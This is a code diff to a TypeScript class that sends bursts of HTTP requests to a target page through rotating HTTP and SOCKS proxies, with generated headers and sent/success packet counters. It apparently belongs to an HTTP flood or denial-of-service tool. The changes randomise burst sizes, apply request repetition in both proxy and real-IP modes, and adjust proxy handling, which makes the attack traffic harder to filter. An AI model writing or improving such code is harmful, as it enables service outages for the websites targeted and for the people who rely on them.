@@ -6,42 +6,52 @@ import { ProxyPool, Proxy } from '../external/proxyPool'
 import { Algorithm, Config, ExecutionResult } from './algorithm'
 
 import { HttpHeadersUtils } from './utils/httpHeadersUtils'
+import { sleep } from '../helpers'
 
 export abstract class SimpleHTTP extends Algorithm {
   protected proxyPool: ProxyPool
+  private validateStatusFn: () => boolean
 
   abstract get method(): Method
 
   constructor (config: Config, proxyPool: ProxyPool) {
     super(config)
     this.proxyPool = proxyPool
+    this.validateStatusFn = () => true
+  }
+
+  isValid (target: GetTarget): boolean {
+    if (typeof target.page !== 'string' || !target.page.startsWith('http')) {
+      return false
+    }
+    return true
   }
 
   async execute (target: GetTarget): Promise<ExecutionResult> {
     // Setting up proxy config
     let packetsSend = 0, packetsSuccess = 0
 
-    if (this.config.useRealIP) {
-      const success = await this.makeRequest(target.page, {})
-      packetsSend += 1
-      packetsSuccess += (success) ? 1 : 0
-    } else {
+    let proxyConfig = {}
+    let repeats = 16 + Math.floor(Math.random() * 32)
+
+    if (!this.config.useRealIP) {
       const proxy = this.proxyPool.getRandomProxy()
       if (proxy === null) {
-        console.warn('Proxy request failed, because proxy wasnt founded.')
-        await new Promise(resolve => setTimeout(resolve, 100))
+        console.warn('Proxy request failed because proxy wasnt found.')
+        await sleep(100)
         return { packetsSend, packetsSuccess, target }
       }
+      proxyConfig = this.generateProxyAxiosConfig(proxy)
+      repeats += Math.floor(Math.random() * 32)
+    }
 
-      const proxyConfig = this.generateProxyAxiosConfig(proxy)
-      let success = true
-      let repeats = 64
-      while (success) {
-        success = await this.makeRequest(target.page, proxyConfig)
-        packetsSend += 1
-        packetsSuccess += (success) ? 1 : 0
-        repeats = repeats - 1
-        success = success && (repeats > 0)
+    let success = true
+    while (success && repeats > 0) {
+      success = await this.makeRequest(target.page, proxyConfig)
+      packetsSend += 1
+      repeats -= 1
+      if (success) {
+        packetsSuccess++
       }
     }
 
@@ -56,7 +66,7 @@ export abstract class SimpleHTTP extends Algorithm {
         url,
         timeout: this.config.timeout,
         headers: HttpHeadersUtils.generateRequestHeaders(),
-        validateStatus: () => true
+        validateStatus: this.validateStatusFn
       })
       console.log(`${new Date().toISOString()} | ${url} | ${response.status}`)
       return true
@@ -71,6 +81,7 @@ export abstract class SimpleHTTP extends Algorithm {
     if (proxy.scheme === 'socks4' || proxy.scheme === 'socks5') {
       const agent = new SocksProxyAgent({
         host: proxy.host,
+        hostname: proxy.host,
         port: proxy.port,
         username: proxy.username,
         password: proxy.password
